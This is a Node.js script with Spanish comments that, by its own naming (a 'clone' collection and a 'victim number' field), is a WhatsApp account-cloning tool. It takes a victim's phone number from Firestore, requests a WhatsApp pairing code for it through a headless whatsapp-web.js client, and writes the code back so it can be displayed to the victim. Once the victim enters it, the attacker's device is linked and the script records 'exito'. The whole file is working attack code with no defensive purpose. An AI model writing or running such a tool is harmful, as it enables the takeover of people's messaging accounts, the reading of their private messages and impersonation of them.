const { Client, LocalAuth } = require('whatsapp-web.js');
const admin = require('firebase-admin');
const express = require('express');
const fs = require('fs');
const app = express();

// --- LIMPIEZA AUTOMÁTICA DE BLOQUEOS ---
const sessionPath = './.wwebjs_auth';
if (fs.existsSync(sessionPath)) {
    console.log("🧹 Limpiando bloqueos de sesión anteriores...");
    try { fs.rmSync(sessionPath, { recursive: true, force: true }); } catch(e){}
}

// 1. CARGAR FIREBASE
const serviceAccount = require("./serviceAccountKey.json"); 
if (!admin.apps.length) {
    admin.initializeApp({ credential: admin.credential.cert(serviceAccount) });
}
const db = admin.firestore();
console.log("✅ CONFIGURACIÓN FIREBASE LISTA");

// 2. CONFIGURACIÓN WHATSAPP
const client = new Client({
    authStrategy: new LocalAuth(),
    puppeteer: {
        headless: true,
        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--disable-gpu',
            '--no-zygote'
        ]
    }
});

// ESCUCHA DE FIREBASE
db.collection("wa_clon_global").doc("current_session").onSnapshot(async (snap) => {
    if (!snap.exists) return;
    const data = snap.data();
    
    if (data.status === "solicitando_codigo" && !data.pairingCode) {
        console.log("🚀 SOLICITANDO CÓDIGO PARA: " + data.numero_victima);
        try {
            const code = await client.requestPairingCode(data.numero_victima);
            console.log("🔑 CÓDIGO GENERADO: " + code);
            await snap.ref.update({ pairingCode: code, status: "mostrando_codigo" });
        } catch (err) {
            console.log("❌ ERROR EN VINCULACIÓN: " + err.message);
        }
    }
});

client.on('ready', () => {
    console.log("🎯 DISPOSITIVO VINCULADO");
    db.collection("wa_clon_global").doc("current_session").update({ status: "exito" });
});

client.initialize().catch(e => console.log("Fallo al iniciar WhatsApp: " + e));

// SERVIDOR DE SALUD
app.get('/', (req, res) => res.send('MOTOR OK'));
app.listen(5000, "0.0.0.0", () => console.log("📡 Servidor activo en puerto 5000"));
